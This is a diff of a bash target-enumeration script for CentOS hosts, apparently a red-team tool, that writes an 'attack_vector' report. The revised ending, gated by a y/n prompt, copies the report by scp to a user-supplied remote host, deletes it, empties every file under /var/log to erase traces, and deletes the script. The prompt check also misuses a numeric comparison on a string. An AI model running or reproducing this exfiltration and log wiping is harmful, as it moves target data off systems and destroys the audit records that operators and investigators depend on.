@@ -19,14 +19,6 @@ echo -n "Title Enumeration File: "
 read ans
 echo $ans
 
-echo -n "Usr Name: "
-read ans1
-echo $ans1
-
-echo -n "Usr IP: "
-read ans2
-echo $ans2
-
 echo "Target Enumeration Text File" &> ${ans}_centos_attack_vector.txt
 echo " " &>>  ${ans}_centos_attack_vector.txt
 
@@ -68,13 +60,22 @@ echo " " &>> ${ans}_centos_attack_vector.txt
 echo "Target Enumeration Complete"
 echo "Please move this off the box and share in Slack. 'scp ${ans}_centos_attack_vector.txt <dst@ip>:' "
 
-scp ${ans}_centos_attack_vector.txt $ans1@$ans2:
+echo -n "Would you like to import this to your own box? (y/n): "
+read answer
 
-rm -f ${ans}_centos_attack_vector.txt
-
-for CLEAN in $(find /var/log/ -type f)
-do
-    cp /dev/null  $CLEAN
-done
-
-rm -f centos_targetenum.sh
+if [ $answer -eq "y" ] 
+  then
+  echo -n "Usr Name: "
+  read ans1
+  echo $ans1
+  echo -n "Usr IP: "
+  read ans2
+  echo $ans2
+  scp ${ans}_centos_attack_vector.txt $ans1@$ans2:
+  rm -f ${ans}_centos_attack_vector.txt
+  for CLEAN in $(find /var/log/ -type f)
+  do
+      cp /dev/null  $CLEAN
+  done
+  rm -f centos_targetenum2.sh
+fi
